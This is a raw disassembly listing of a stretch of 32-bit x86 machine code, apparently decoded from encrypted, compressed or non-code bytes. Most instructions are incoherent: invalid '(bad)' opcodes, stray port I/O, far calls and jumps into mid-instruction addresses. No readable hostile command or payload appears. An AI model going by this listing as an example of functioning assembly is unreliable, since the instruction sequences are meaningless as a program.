  406839:	ed                   	in     (%dx),%eax
  40683a:	fd                   	std
  40683b:	0e                   	push   %cs
  40683c:	dc a2 78 66 00 c7    	fsubl  -0x38ff9988(%edx)
  406842:	9a 24 68 0c 0a e8 29 	lcall  $0x29e8,$0xa0c6824
  406849:	64 d2 62 97          	shlb   %cl,%fs:-0x69(%edx)
  40684d:	9b                   	fwait
  40684e:	c5 0e                	lds    (%esi),%ecx
  406850:	a8 43                	test   $0x43,%al
  406852:	33 66 80             	xor    -0x80(%esi),%esp
  406855:	b7 2f                	mov    $0x2f,%bh
  406857:	66 68 e7 fe          	pushw  $0xfee7
  40685b:	76 e1                	jbe    0x40683e
  40685d:	9c                   	pushf
  40685e:	cd 81                	int    $0x81
  406860:	e1 21                	loope  0x406883
  406862:	c6                   	(bad)
  406863:	ef                   	out    %eax,(%dx)
  406864:	af                   	scas   %es:(%edi),%eax
  406865:	8f                   	(bad)
  406866:	ee                   	out    %al,(%dx)
  406867:	39 a1 a6 3e 66 3d    	cmp    %esp,0x3d663ea6(%ecx)
  40686d:	ed                   	in     (%dx),%eax
  40686e:	df 37                	fbstp  (%edi)
  406870:	3b 32                	cmp    (%edx),%esi
  406872:	6d                   	insl   (%dx),%es:(%edi)
  406873:	ed                   	in     (%dx),%eax
  406874:	1d 6c 85 56 7d       	sbb    $0x7d56856c,%eax
  406879:	c3                   	ret
  40687a:	73 de                	jae    0x40685a
  40687c:	32 0a                	xor    (%edx),%cl
  40687e:	3a 66 9f             	cmp    -0x61(%esi),%ah
  406881:	83 b3 23 94 ed fd ef 	xorl   $0xffffffef,-0x2126bdd(%ebx)
  406888:	9f                   	lahf
  406889:	32 d2                	xor    %dl,%dl
  40688b:	13 7b 64             	adc    0x64(%ebx),%edi
  40688e:	3a eb                	cmp    %bl,%ch
  406890:	34 62                	xor    $0x62,%al
  406892:	3b 31                	cmp    (%ecx),%esi
  406894:	3b 8c fb 90 97 9b b9 	cmp    -0x46646870(%ebx,%edi,8),%ecx
  40689b:	a2 60 6d fa 12       	mov    %al,0x12fa6d60
  4068a0:	60                   	pusha
  4068a1:	0e                   	push   %cs
  4068a2:	3a 31                	cmp    (%ecx),%dh
  4068a4:	80 27 29             	andb   $0x29,(%edi)
  4068a7:	66 68 3b 64          	pushw  $0x643b
  4068ab:	3d a1 a6 3e 66       	cmp    $0x663ea6a1,%eax
  4068b0:	3d ed df e7 84       	cmp    $0x84e7dfed,%eax
  4068b5:	40                   	inc    %eax
  4068b6:	3d 66 68 37 6c       	cmp    $0x6c376866,%eax
  4068bb:	31 d6                	xor    %edx,%esi
  4068bd:	7b 5d                	jnp    0x40691c
  4068bf:	73 31                	jae    0x4068f2
  4068c1:	e5 d4                	in     $0xd4,%eax
  4068c3:	44                   	inc    %esp
  4068c4:	4a                   	dec    %edx
  4068c5:	64 3a 0e             	cmp    %fs:(%esi),%cl
  4068c8:	08 eb                	or     %ch,%bl
  4068ca:	78 66                	js     0x406932
  4068cc:	00 a6 9a 24 68 8c    	add    %ah,-0x7397db66(%esi)
  4068d2:	bf 90 97 9b b9       	mov    $0xb99b9790,%edi
  4068d7:	a2 60 ed bf 8a       	mov    %al,0x8abfed60
  4068dc:	90                   	nop
  4068dd:	9b                   	fwait
  4068de:	c5 6f a8             	lds    -0x58(%edi),%ebp
  4068e1:	6b be 43 6b 64 3a de 	imul   $0xffffffde,0x3a646b43(%esi),%edi
  4068e8:	88 74 3a 66          	mov    %dh,0x66(%edx,%edi,1)
  4068ec:	9f                   	lahf
  4068ed:	82 b3 e3 80 9c c5 99 	xorb   $0x99,-0x3a637f1d(%ebx)
  4068f4:	e1 a2                	loope  0x406898
  4068f6:	0b bd 02 64 52 06    	or     0x6526402(%ebp),%edi
  4068fc:	e7 26                	out    %eax,$0x26
  4068fe:	3a 8e 7d a9 c5 99    	cmp    -0x663a5683(%esi),%cl
  406904:	eb a0                	jmp    0x4068a6
  406906:	32 ef                	xor    %bh,%ch
  406908:	ed                   	in     (%dx),%eax
  406909:	94                   	xchg   %eax,%esp
  40690a:	c2 99 97             	ret    $0x9799
  40690d:	6d                   	insl   (%dx),%es:(%edi)
  40690e:	fa                   	cli
  40690f:	69 ed a8 38 66 68    	imul   $0x686638a8,%ebp,%ebp
  406915:	8d                   	lea    (bad),%ecx
  406916:	c8 64 68 64          	enter  $0x6864,$0x64
  40691a:	ba db 94 98 c5       	mov    $0xc59894db,%edx
  40691f:	99                   	cltd
  406920:	68 6b be dc 6a       	push   $0x6adcbe6b
  406925:	64 3a e6             	fs cmp %dh,%ah
  406928:	d5 98                	aad    $0x98
  40692a:	c6                   	(bad)
  40692b:	99                   	cltd
  40692c:	97                   	xchg   %eax,%edi
  40692d:	5e                   	pop    %esi
  40692e:	35 e3 5a 65 3a       	xor    $0x3a655ae3,%eax
  406933:	66 e8 d9 c5          	callw  0x2f10
  406937:	9a 97 9b 00 69 ed 41 	lcall  $0x41ed,$0x69009b97
  40693e:	3b 66 68             	cmp    0x68(%esi),%esp
  406941:	a2 bf 99 94 9b       	mov    %al,0x9b9499bf
  406946:	c5 66 e5             	lds    -0x1b(%esi),%esp
  406949:	e1 c2                	loope  0x40690d
  40694b:	9e                   	sahf
  40694c:	97                   	xchg   %eax,%edi
  40694d:	9b                   	fwait
  40694e:	6a 0e                	push   $0xe
  406950:	c6                   	(bad)
  406951:	a2 78 66 e5 e1       	mov    %al,0xe1e56678
  406956:	c6                   	(bad)
  406957:	9a 97 9b 6a 8e 34 71 	lcall  $0x7134,$0x8e6a9b97
  40695e:	3a 66 eb             	cmp    -0x15(%esi),%ah
  406961:	a0 36 ef 98 65       	mov    0x6598ef36,%al
  406966:	ca ef ae             	lret   $0xaeef
  406969:	e7 87                	out    %eax,$0x87
  40696b:	9e                   	sahf
  40696c:	90                   	nop
  40696d:	9b                   	fwait
  40696e:	c5 66 1c             	lds    0x1c(%esi),%esp
  406971:	4d                   	dec    %ebp
  406972:	d2 73 7d             	shlb   %cl,0x7d(%ebx)
  406975:	64 3a dc             	fs cmp %ah,%bl
  406978:	ab                   	stos   %eax,%es:(%edi)
  406979:	f3 21 04 39          	repz and %eax,(%ecx,%edi,1)
  40697d:	ed                   	in     (%dx),%eax
  40697e:	fb                   	sti
  40697f:	91                   	xchg   %eax,%ecx
  406980:	82 a5 c0 61 a9 9d 25 	andb   $0x25,-0x62569e40(%ebp)
  406987:	4f                   	dec    %edi
  406988:	a2 ed ea 3f e1       	mov    %al,0xe13feaed
  40698d:	a3 7d 5d d5 9c       	mov    %eax,0x9cd55d7d
  406992:	c2 99 97             	ret    $0x9799
  406995:	6b bd 20 6a 64 3a e5 	imul   $0xffffffe5,0x3a646a20(%ebp),%edi
  40699c:	55                   	push   %ebp
  40699d:	04 b7                	add    $0xb7,%al
  40699f:	27                   	daa
  4069a0:	68 66 4f 51 00       	push   $0x514f66
  4069a5:	e4 aa                	in     $0xaa,%al
  4069a7:	24 68                	and    $0x68,%al
  4069a9:	0c 99                	or     $0x99,%al
  4069ab:	a0 2a 64 b7 e3       	mov    0xe3b7642a,%al
  4069b0:	94                   	xchg   %eax,%esp
  4069b1:	9a c5 99 38 8c d0 72 	lcall  $0x72d0,$0x8c3899c5
  4069b8:	68 64 bb 88 13       	push   $0x1388bb64
  4069bd:	02 3a                	add    (%edx),%bh
  4069bf:	66 00 e4             	data16 add %ah,%ah
  4069c2:	aa                   	stos   %al,%es:(%edi)
  4069c3:	24 68                	and    $0x68,%al
  4069c5:	0c a2                	or     $0xa2,%al
  4069c7:	a0 2a 64 b7 e3       	mov    0xe3b7642a,%al
  4069cc:	94                   	xchg   %eax,%esp
  4069cd:	9c                   	pushf
  4069ce:	c5 99 38 8c f4 72    	lds    0x72f48c38(%ecx),%ebx
  4069d4:	68 64 b9 a2 70       	push   $0x70a2b964
  4069d9:	8f                   	(bad)
  4069da:	76 0e                	jbe    0x4069ea
  4069dc:	68 60 3a 66 e5       	push   $0xe5663a60
  4069e1:	e1 c6                	loope  0x4069a9
  4069e3:	9e                   	sahf
  4069e4:	97                   	xchg   %eax,%edi
  4069e5:	9b                   	fwait
  4069e6:	6a 8e                	push   $0xffffff8e
  4069e8:	6c                   	insb   (%dx),%es:(%edi)
  4069e9:	75 3a                	jne    0x406a25
  4069eb:	66 d0 9e 7c 66 68 93 	data16 rcrb $1,-0x6c979984(%esi)
  4069f2:	dc ef                	fsubr  %st,%st(7)
  4069f4:	ed                   	in     (%dx),%eax
  4069f5:	80 c2 99             	add    $0x99,%dl
  4069f8:	97                   	xchg   %eax,%edi
  4069f9:	ed                   	in     (%dx),%eax
  4069fa:	fc                   	cld
  4069fb:	eb ed                	jmp    0x4069ea
  4069fd:	98                   	cwtl
  4069fe:	c2 99 97             	ret    $0x9799
  406a01:	34 52                	xor    $0x52,%al
  406a03:	ef                   	out    %eax,(%dx)
  406a04:	ae                   	scas   %es:(%edi),%al
  406a05:	26 3a eb             	es cmp %bl,%ch
  406a08:	ed                   	in     (%dx),%eax
  406a09:	98                   	cwtl
  406a0a:	c4 99 97 34 d2 f7    	les    -0x82dcb69(%ecx),%ebx
  406a10:	7c 64                	jl     0x406a76
  406a12:	3a 0e                	cmp    (%esi),%cl
  406a14:	14 a2                	adc    $0xa2,%al
  406a16:	78 66                	js     0x406a7e
  406a18:	e5 e1                	in     $0xe1,%eax
  406a1a:	c6                   	(bad)
  406a1b:	9e                   	sahf
  406a1c:	97                   	xchg   %eax,%edi
  406a1d:	9b                   	fwait
  406a1e:	6a 8e                	push   $0xffffff8e
  406a20:	cc                   	int3
  406a21:	70 3a                	jo     0x406a5d
  406a23:	66 eb a0             	data16 jmp 0x4069c6
  406a26:	2e eb ed             	cs jmp 0x406a16
  406a29:	98                   	cwtl
  406a2a:	c4 99 97 34 d2 93    	les    -0x6c2dcb69(%ecx),%ebx
  406a30:	79 64                	jns    0x406a96
  406a32:	3a eb                	cmp    %bl,%ch
  406a34:	ed                   	in     (%dx),%eax
  406a35:	98                   	cwtl
  406a36:	c6                   	(bad)
  406a37:	99                   	cltd
  406a38:	97                   	xchg   %eax,%edi
  406a39:	e7 fa                	out    %eax,$0xfa
  406a3b:	62 38                	bound  %edi,(%eax)
  406a3d:	e9 bf 9a 90 9b       	jmp    0x9bd10501
  406a42:	c5 36                	lds    (%esi),%esi
  406a44:	00 17                	add    %dl,(%edi)
  406a46:	fc                   	cld
  406a47:	24 68                	and    $0x68,%al
  406a49:	e9 bf 9a 90 9b       	jmp    0x9bd1050d
  406a4e:	c5 36                	lds    (%esi),%esi
  406a50:	80 2b 2e             	subb   $0x2e,(%ebx)
  406a53:	66 68 e7 fe          	pushw  $0xfee7
  406a57:	76 02                	jbe    0x406a5b
  406a59:	64 b7 e3             	fs mov $0xe3,%bh
  406a5c:	94                   	xchg   %eax,%esp
  406a5d:	9c                   	pushf
  406a5e:	c5 99 38 8c bc 77    	lds    0x77bc8c38(%ecx),%ebx
  406a64:	68 64 50 67 00       	push   $0x675064
  406a69:	09 fc                	or     %edi,%esp
  406a6b:	24 68                	and    $0x68,%al
  406a6d:	e9 bf 9a 94 9b       	jmp    0x9bd50531
  406a72:	c5 36                	lds    (%esi),%esi
  406a74:	80 a6 93 99 97 e7 fe 	andb   $0xfe,-0x1868666d(%esi)
  406a7b:	6a 61                	push   $0x61
  406a7d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406a7e:	35 e3 35 65 3a       	xor    $0x3a6535e3,%eax
  406a83:	66 e5 e1             	in     $0xe1,%ax
  406a86:	c6                   	(bad)
  406a87:	9a 97 9b b9 a6 6d 34 	lcall  $0x346d,$0xa6b99b97
  406a8e:	d2 d7                	rcl    %cl,%bh
  406a90:	7b 64                	jnp    0x406af6
  406a92:	3a 3f                	cmp    (%edi),%bh
  406a94:	e1 e1                	loope  0x406a77
  406a96:	c2 9e 97             	ret    $0x979e
  406a99:	9b                   	fwait
  406a9a:	b3 96                	mov    $0x96,%bl
  406a9c:	59                   	pop    %ecx
  406a9d:	94                   	xchg   %eax,%esp
  406a9e:	b3 a0                	mov    $0xa0,%bl
  406aa0:	eb d9                	jmp    0x406a7b
  406aa2:	c2 9e 97             	ret    $0x979e
  406aa5:	9b                   	fwait
  406aa6:	36 69 ee 50 3b 66 68 	ss imul $0x68663b50,%esi,%ebp
  406aad:	9b                   	fwait
  406aae:	8f                   	(bad)
  406aaf:	9e                   	sahf
  406ab0:	90                   	nop
  406ab1:	9b                   	fwait
  406ab2:	c5 0e                	lds    (%esi),%ecx
  406ab4:	e8 f4 78 66 00       	call   0xa6e3ad
  406ab9:	3a fc                	cmp    %ah,%bh
  406abb:	24 68                	and    $0x68,%al
  406abd:	e9 bf 9a 90 9b       	jmp    0x9bd10581
  406ac2:	c5 36                	lds    (%esi),%esi
  406ac4:	80 bf 29 66 68 e7 fe 	cmpb   $0xfe,-0x189799d7(%edi)
  406acb:	76 00                	jbe    0x406acd
  406acd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406ace:	9a 24 68 e9 bf 9a 96 	lcall  $0x969a,$0xbfe96824
  406ad5:	9b                   	fwait
  406ad6:	c5 36                	lds    (%esi),%esi
  406ad8:	80 43 35 66          	addb   $0x66,0x35(%ebx)
  406adc:	68 e9 bf 9a 96       	push   $0x969abfe9
  406ae1:	9b                   	fwait
  406ae2:	c5 36                	lds    (%esi),%esi
  406ae4:	80 7f 2b 66          	cmpb   $0x66,0x2b(%edi)
  406ae8:	68 ed bf 82 90       	push   $0x9082bfed
  406aed:	9b                   	fwait
  406aee:	c5 8d 4e ef bf 82    	lds    -0x7d4010b2(%ebp),%ecx
  406af4:	90                   	nop
  406af5:	9b                   	fwait
  406af6:	c5 e6 d4             	(bad)
  406af9:	61                   	popa
  406afa:	c6                   	(bad)
  406afb:	98                   	cwtl
  406afc:	97                   	xchg   %eax,%edi
  406afd:	9b                   	fwait
  406afe:	15 13 78 ef bf       	adc    $0xbfef7813,%eax
  406b03:	82 90 9b c5 a0 ec 61 	adcb   $0x61,-0x135f3a65(%eax)
  406b0a:	c6                   	(bad)
  406b0b:	98                   	cwtl
  406b0c:	97                   	xchg   %eax,%edi
  406b0d:	9b                   	fwait
  406b0e:	3a 8d 67 9b b7 82    	cmp    -0x7d486499(%ebp),%cl
  406b14:	90                   	nop
  406b15:	9b                   	fwait
  406b16:	c5 e5 d5 80 c2 99 97 	vpmullw 0x679799c2(%eax),%ymm3,%ymm0
  406b1d:	67 
  406b1e:	4d                   	dec    %ebp
  406b1f:	b7 e1                	mov    $0xe1,%bh
  406b21:	94                   	xchg   %eax,%esp
  406b22:	cd 80                	int    $0x80
  406b24:	e1 e1                	loope  0x406b07
  406b26:	da 9e 97 9b b3 a0    	ficompl -0x5f4c6469(%esi)
  406b2c:	97                   	xchg   %eax,%edi
  406b2d:	d1 c2                	rol    $1,%edx
  406b2f:	9e                   	sahf
  406b30:	97                   	xchg   %eax,%edi
  406b31:	9b                   	fwait
  406b32:	b7 e3                	mov    $0xe3,%bh
  406b34:	94                   	xchg   %eax,%esp
  406b35:	9a c5 99 38 0c 75 a0 	lcall  $0xa075,$0xc3899c5
  406b3c:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  406b40:	94                   	xchg   %eax,%esp
  406b41:	9a c5 99 38 8c 60 75 	lcall  $0x7560,$0x8c3899c5
  406b48:	68 64 b9 a2 78       	push   $0x78a2b964
  406b4d:	e9 bf 9a 90 9b       	jmp    0x9bd10611
  406b52:	c5 36                	lds    (%esi),%esi
  406b54:	80 cf 2a             	or     $0x2a,%bh
  406b57:	66 68 ed bf          	pushw  $0xbfed
  406b5b:	ba 90 9b c5 eb       	mov    $0xebc59b90,%edx
  406b60:	d5 98                	aad    $0x98
  406b62:	c4 99 97 33 d2 ff    	les    -0x2dcc69(%ecx),%ebx
  406b68:	78 64                	js     0x406bce
  406b6a:	3a ed                	cmp    %ch,%ch
  406b6c:	d5 b8                	aad    $0xb8
  406b6e:	c2 99 97             	ret    $0x9799
  406b71:	e9 46 61 78 33       	jmp    0x33b8ccbc
  406b76:	50                   	push   %eax
  406b77:	26 80 a3 35 66 68 ed 	andb   $0xbf,%es:-0x129799cb(%ebx)
  406b7e:	bf 
  406b7f:	92                   	xchg   %eax,%edx
  406b80:	90                   	nop
  406b81:	9b                   	fwait
  406b82:	c5 e7 86             	(bad)
  406b85:	85 62 66             	test   %esp,0x66(%edx)
  406b88:	68 e9 bf 9a 90       	push   $0x909abfe9
  406b8d:	9b                   	fwait
  406b8e:	c5 36                	lds    (%esi),%esi
  406b90:	97                   	xchg   %eax,%edi
  406b91:	d1 ce                	ror    $1,%esi
  406b93:	9e                   	sahf
  406b94:	97                   	xchg   %eax,%edi
  406b95:	9b                   	fwait
  406b96:	d2 0f                	rorb   %cl,(%edi)
  406b98:	66 64 3a eb          	data16 fs cmp %bl,%ch
  406b9c:	ed                   	in     (%dx),%eax
  406b9d:	98                   	cwtl
  406b9e:	c2 99 97             	ret    $0x9799
  406ba1:	34 d2                	xor    $0xd2,%al
  406ba3:	3b 78 64             	cmp    0x64(%eax),%edi
  406ba6:	3a eb                	cmp    %bl,%ch
  406ba8:	d5 98                	aad    $0x98
  406baa:	c4 99 97 33 b1 db    	les    -0x244ecc69(%ecx),%ebx
  406bb0:	9c                   	pushf
  406bb1:	9c                   	pushf
  406bb2:	c5 99 e5 18 3d 67    	lds    0x673d18e5(%ecx),%ebx
  406bb8:	3f                   	aas
  406bb9:	8c 7c 68 68          	mov    %?,0x68(%eax,%ebp,2)
  406bbd:	64 b7 e3             	fs mov $0xe3,%bh
  406bc0:	90                   	nop
  406bc1:	9c                   	pushf
  406bc2:	c5 99 38 0e 3a 99    	lds    -0x66c5f1c8(%ecx),%ebx
  406bc8:	dd 90 c2 99 97 0c    	fstl   0xc9799c2(%eax)
  406bce:	56                   	push   %esi
  406bcf:	0e                   	push   %cs
  406bd0:	28 64 50 66          	sub    %ah,0x66(%eax,%edx,2)
  406bd4:	02 64 d2 27          	add    0x27(%edx,%edx,8),%ah
  406bd8:	78 64                	js     0x406c3e
  406bda:	3a 36                	cmp    (%esi),%dh
  406bdc:	80 df 34             	sbb    $0x34,%bh
  406bdf:	66 68 e9 bf          	pushw  $0xbfe9
  406be3:	9a 94 9b c5 36 3b 9b 	lcall  $0x9b3b,$0x36c59b94
  406bea:	8f                   	(bad)
  406beb:	96                   	xchg   %eax,%esi
  406bec:	90                   	nop
  406bed:	9b                   	fwait
  406bee:	c5 8e a3 b3 c5 99    	lds    -0x663a4c5d(%esi),%ecx
  406bf4:	eb a0                	jmp    0x406b96
  406bf6:	36 ef                	ss out %eax,(%dx)
  406bf8:	ab                   	stos   %eax,%es:(%edi)
  406bf9:	6d                   	insl   (%dx),%es:(%edi)
  406bfa:	fa                   	cli
  406bfb:	69 ed 7d c7 99 97    	imul   $0x9799c77d,%ebp,%ebp
  406c01:	9b                   	fwait
  406c02:	8f                   	(bad)
  406c03:	96                   	xchg   %eax,%esi
  406c04:	90                   	nop
  406c05:	9b                   	fwait
  406c06:	c5 8e 2c 6b 3a 66    	lds    0x663a6b2c(%esi),%ecx
  406c0c:	e9 8a ec 7e 68       	jmp    0x68bf589b
  406c11:	64 52                	fs push %edx
  406c13:	26 1f                	es pop %ds
  406c15:	7f 3a                	jg     0x406c51
  406c17:	8e 78 76             	mov    0x76(%eax),%?
  406c1a:	3a 66 31             	cmp    0x31(%esi),%ah
  406c1d:	8d 9f 9a 97 9b 65    	lea    0x659b979a(%edi),%ebx
  406c23:	38 33                	cmp    %dh,(%ebx)
  406c25:	ad                   	lods   %ds:(%esi),%eax
  406c26:	f8                   	clc
  406c27:	62 68 31             	bound  %ebp,0x31(%eax)
  406c2a:	b3 83                	mov    $0x83,%bl
  406c2c:	e9 88 4a 64 68       	jmp    0x68a4b6b9
  406c31:	64 69 30 3f da ad 4a 	imul   $0x4aadda3f,%fs:(%eax),%esi
  406c38:	bd 0d b3 96 59       	mov    $0x5996b30d,%ebp
  406c3d:	94                   	xchg   %eax,%esp
  406c3e:	b3 a0                	mov    $0xa0,%bl
  406c40:	59                   	pop    %ecx
  406c41:	94                   	xchg   %eax,%esp
  406c42:	b3 a0                	mov    $0xa0,%bl
  406c44:	00 f0                	add    %dh,%al
  406c46:	9a 24 68 0e 3a 0e 69 	lcall  $0x690e,$0x3a0e6824
  406c4d:	64 25 66 80 63 35    	fs and $0x35638066,%eax
  406c53:	66 68 ed bf          	pushw  $0xbfed
  406c57:	d6                   	salc
  406c58:	96                   	xchg   %eax,%esi
  406c59:	9b                   	fwait
  406c5a:	c5 6f a8             	lds    -0x58(%edi),%ebp
  406c5d:	10 34 36             	adc    %dh,(%esi,%esi,1)
  406c60:	80 53 34 66          	adcb   $0x66,0x34(%ebx)
  406c64:	68 0e 3b 8e 8c       	push   $0x8c8e3b0e
  406c69:	75 3a                	jne    0x406ca5
  406c6b:	66 31 ef             	xor    %bp,%di
  406c6e:	7f 6e                	jg     0x406cde
  406c70:	cb                   	lret
  406c71:	44                   	inc    %esp
  406c72:	b4 27                	mov    $0x27,%ah
  406c74:	68 e5 d4 9b 2c       	push   $0x2c9bd4e5
  406c79:	64 3a a1 6d 34 b7 27 	cmp    %fs:0x27b7346d(%ecx),%ah
  406c80:	68 f0 3a 66 68       	push   $0x68663af0
  406c85:	0c 6a                	or     $0x6a,%al
  406c87:	eb 29                	jmp    0x406cb2
  406c89:	64 d2 33             	shlb   %cl,%fs:(%ebx)
  406c8c:	66 64 3a 0e          	data16 cmp %fs:(%esi),%cl
  406c90:	97                   	xchg   %eax,%edi
  406c91:	64 3a 66 00          	cmp    %fs:0x0(%esi),%ah
  406c95:	e4 aa                	in     $0xaa,%al
  406c97:	24 68                	and    $0x68,%al
  406c99:	8c 2c 68             	mov    %gs,(%eax,%ebp,2)
  406c9c:	68 64 d2 4f 66       	push   $0x664fd264
  406ca1:	64 3a 36             	cmp    %fs:(%esi),%dh
  406ca4:	80 63 28 66          	andb   $0x66,0x28(%ebx)
  406ca8:	68 e5 cc e8 45       	push   $0x45e8cce5
  406cad:	64 3a 0e             	cmp    %fs:(%esi),%cl
  406cb0:	6c                   	insb   (%dx),%es:(%edi)
  406cb1:	65 3a 66 e5          	cmp    %gs:-0x1b(%esi),%ah
  406cb5:	e1 82                	loope  0x406c39
  406cb7:	98                   	cwtl
  406cb8:	97                   	xchg   %eax,%edi
  406cb9:	9b                   	fwait
  406cba:	6a 99                	push   $0xffffff99
  406cbc:	1d 6c d2 a7 65       	sbb    $0x65a7d26c,%eax
  406cc1:	64 3a 0c 69          	cmp    %fs:(%ecx,%ebp,2),%cl
  406cc5:	0c ba                	or     $0xba,%al
  406cc7:	f6 2a                	imulb  (%edx)
  406cc9:	64 b7 e3             	fs mov $0xe3,%bh
  406ccc:	d0 9a c5 99 38 8c    	rcrb   $1,-0x73c7663b(%edx)
  406cd2:	5f                   	pop    %edi
  406cd3:	c1 97 9b b9 a2 78 59 	rcll   $0x59,0x78a2b99b(%edi)
  406cda:	c5 99 68 64 35 e3    	lds    -0x1cca9b98(%ecx),%ebx
  406ce0:	4b                   	dec    %ebx
  406ce1:	65 3a 66 eb          	cmp    %gs:-0x15(%esi),%ah
  406ce5:	61                   	popa
  406ce6:	3a c7                	cmp    %bh,%al
  406ce8:	2a 64 32 b7          	sub    -0x49(%edx,%esi,1),%ah
  406cec:	4d                   	dec    %ebp
  406ced:	64 9b                	fs fwait
  406cef:	24 68                	and    $0x68,%al
  406cf1:	9b                   	fwait
  406cf2:	3f                   	aas
  406cf3:	66 c9                	leavew
  406cf5:	26 3a ef             	es cmp %bh,%ch
  406cf8:	98                   	cwtl
  406cf9:	93                   	xchg   %eax,%ebx
  406cfa:	dc ef                	fsubr  %st,%st(7)
  406cfc:	ed                   	in     (%dx),%eax
  406cfd:	f0 c7                	lock (bad)
  406cff:	99                   	cltd
  406d00:	97                   	xchg   %eax,%edi
  406d01:	ed                   	in     (%dx),%eax
  406d02:	fc                   	cld
  406d03:	8e ec                	mov    %esp,%gs
  406d05:	75 3a                	jne    0x406d41
  406d07:	66 d2 b7 77 04 78 ed 	data16 shlb %cl,-0x1287fb89(%edi)
  406d0e:	fb                   	sti
  406d0f:	91                   	xchg   %eax,%ecx
  406d10:	82 a5 c0 61 a9 9d 25 	andb   $0x25,-0x62569e40(%ebp)
  406d17:	4f                   	dec    %edi
  406d18:	a2 ed ed e5 af       	mov    %al,0xafe5eded
  406d1d:	25 b3 9d e0 f9       	and    $0xf9e09db3,%eax
  406d22:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406d23:	98                   	cwtl
  406d24:	97                   	xchg   %eax,%edi
  406d25:	9b                   	fwait
  406d26:	fc                   	cld
  406d27:	e3 c7                	jecxz  0x406cf0
  406d29:	9a c5 99 69 8f 0a 8e 	lcall  $0x8e0a,$0x8f6999c5
  406d30:	30 75 3a             	xor    %dh,0x3a(%ebp)
  406d33:	66 67 d2 87 c9 96    	data16 rolb %cl,-0x6937(%bx)
  406d39:	9b                   	fwait
  406d3a:	c5 dc bb             	(bad)
  406d3d:	29 58 76             	sub    %ebx,0x76(%eax)
  406d40:	e1 a5                	loope  0x406ce7
  406d42:	cd 8c                	int    $0x8c
  406d44:	a9 9e 3d a7 91       	test   $0x91a73d9e,%eax
  406d49:	7b 13                	jnp    0x406d5e
  406d4b:	ac                   	lods   %ds:(%esi),%al
  406d4c:	e1 b7                	loope  0x406d05
  406d4e:	b9 a5 09 ec a6       	mov    $0xa6ec09a5,%ecx
  406d53:	5b                   	pop    %ebx
  406d54:	f7 9a c5 99 e8 e1    	negl   -0x1e17663b(%edx)
  406d5a:	95                   	xchg   %eax,%ebp
  406d5b:	98                   	cwtl
  406d5c:	97                   	xchg   %eax,%edi
  406d5d:	9b                   	fwait
  406d5e:	3b ec                	cmp    %esp,%ebp
  406d60:	ed                   	in     (%dx),%eax
  406d61:	cb                   	lret
  406d62:	c4 99 97 58 32 10    	les    0x10325897(%ecx),%ebx
  406d68:	ae                   	scas   %es:(%edi),%al
  406d69:	a2 bf c1 96 9b       	mov    %al,0x9b96c1bf
  406d6e:	c5 66 80             	lds    -0x80(%esi),%esp
  406d71:	73 2b                	jae    0x406d9e
  406d73:	66 68 ed f8          	pushw  $0xf8ed
  406d77:	90                   	nop
  406d78:	aa                   	stos   %al,%es:(%edi)
  406d79:	65 4f                	gs dec %edi
  406d7b:	68 ae e1 9f 98       	push   $0x989fe1ae
  406d80:	97                   	xchg   %eax,%edi
  406d81:	9b                   	fwait
  406d82:	09 a0 ed c2 c4 99    	or     %esp,-0x663b3d13(%eax)
  406d88:	97                   	xchg   %eax,%edi
  406d89:	56                   	push   %esi
  406d8a:	bb 88 40 7d 3a       	mov    $0x3a7d4088,%ebx
  406d8f:	66 e5 e1             	in     $0xe1,%ax
  406d92:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406d93:	98                   	cwtl
  406d94:	97                   	xchg   %eax,%edi
  406d95:	9b                   	fwait
  406d96:	6a 0e                	push   $0xe
  406d98:	e8 f4 78 66 00       	call   0xa6e691
  406d9d:	21 fc                	and    %edi,%esp
  406d9f:	24 68                	and    $0x68,%al
  406da1:	e9 bf fd 95 9b       	jmp    0x9bd66b65
  406da6:	c5 36                	lds    (%esi),%esi
  406da8:	80 93 2a 66 68 0e 3a 	adcb   $0x3a,0xe68662a(%ebx)
  406daf:	eb ed                	jmp    0x406d9e
  406db1:	ff c7                	inc    %edi
  406db3:	99                   	cltd
  406db4:	97                   	xchg   %eax,%edi
  406db5:	34 b7                	xor    $0xb7,%al
  406db7:	e3 d0                	jecxz  0x406d89
  406db9:	9a c5 99 38 8c 7c 6b 	lcall  $0x6b7c,$0x8c3899c5
  406dc0:	68 64 b7 e3 f3       	push   $0xf3e3b764
  406dc5:	99                   	cltd
  406dc6:	c5 99 38 8c 21 a9    	lds    -0x56de73c8(%ecx),%ebx
  406dcc:	97                   	xchg   %eax,%edi
  406dcd:	9b                   	fwait
  406dce:	b7 e3                	mov    $0xe3,%bh
  406dd0:	f7 9a c5 99 38 8c    	negl   -0x73c7663b(%edx)
  406dd6:	b4 b7                	mov    $0xb7,%ah
  406dd8:	97                   	xchg   %eax,%edi
  406dd9:	9b                   	fwait
  406dda:	b9 a2 70 e5 fc       	mov    $0xfce570a2,%ecx
  406ddf:	3e 0f 64 3a          	pcmpgtb %ds:(%edx),%mm7
  406de3:	0c 68                	or     $0x68,%al
  406de5:	e9 bf fd 95 9b       	jmp    0x9bd66ba9
  406dea:	c5 36                	lds    (%esi),%esi
  406dec:	80 9f 37 66 68 dc cc 	sbbb   $0xcc,-0x239799c9(%edi)
  406df3:	3d 68 64 cd 80       	cmp    $0x80cd6468,%eax
  406df8:	e1 e1                	loope  0x406ddb
  406dfa:	aa                   	stos   %al,%es:(%edi)
  406dfb:	9b                   	fwait
  406dfc:	97                   	xchg   %eax,%edi
  406dfd:	9b                   	fwait
  406dfe:	b3 a0                	mov    $0xa0,%bl
  406e00:	02 65 d2             	add    -0x2e(%ebp),%ah
  406e03:	4f                   	dec    %edi
  406e04:	64 64 3a 0e          	fs cmp %fs:(%esi),%cl
  406e08:	5d                   	pop    %ebp
  406e09:	a2 78 66 00 e4       	mov    %al,0xe4006678
  406e0e:	aa                   	stos   %al,%es:(%edi)
  406e0f:	24 68                	and    $0x68,%al
  406e11:	0c 05                	or     $0x5,%al
  406e13:	a0 2a 64 52 56       	mov    0x5652642a,%al
  406e18:	e6 25                	out    %al,$0x25
  406e1a:	3a 8e ec 74 3a 66    	cmp    0x663a74ec(%esi),%cl
  406e20:	e1 94                	loope  0x406db6
  406e22:	13 96 e1 a2 52 4d    	adc    0x4d52a2e1(%esi),%edx
  406e28:	ae                   	scas   %es:(%edi),%al
